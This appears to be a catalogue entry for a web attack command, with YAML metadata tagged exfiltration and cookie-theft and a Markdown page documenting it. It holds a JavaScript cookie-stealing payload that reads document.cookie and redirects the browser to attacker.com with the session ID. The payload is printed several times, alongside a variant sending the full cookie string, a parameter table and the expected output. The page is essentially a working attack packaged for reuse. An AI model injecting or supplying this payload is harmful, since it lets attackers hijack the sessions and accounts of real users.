---
data: >-
  var sessionid = document.cookie.split('=')[1] + '.'; document.location =
  'https://attacker.com/?' + sessionid;
tags:
  - exfiltration
  - redirect
  - cookie-theft
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:17.941Z'
id: fd7e8ca6-2536-43d1-ad60-3171df0da1a6
verified: false
validated: true
submitted: true
---
# exfiltrate-session-redirect

## Command

```javascript
var sessionid = document.cookie.split('=')[1] + '.'; document.location = 'https://attacker.com/?' + sessionid;
```

## Description

This JavaScript command extracts the session ID from document.cookie (assuming format sessionid=value), appends a dot, and redirects the browser to an attacker-controlled URL with the ID in the query string for exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| document.cookie.split('=')[1] | Extracts value after first = in cookie string | Yes |
| + '.' | Appends a dot to the extracted ID | Yes |
| document.location | Sets redirect URL (https://attacker.com/? + sessionid) | Yes |

## Examples

### Basic Usage

```javascript
document.location = 'https://attacker.com/?' + document.cookie;
```

### Advanced Usage

```javascript
var sessionid = document.cookie.split('=')[1] + '.'; document.location = 'https://attacker.com/?' + sessionid;
```

## Expected Output

Browser immediately redirects to https://attacker.com/?<sessionid>., sending the cookie data via query parameter; attacker server receives the exfiltrated value.

## Related

- [[Related Procedure|procedures/Exfiltrate-Session-via-Open-Redirect]]
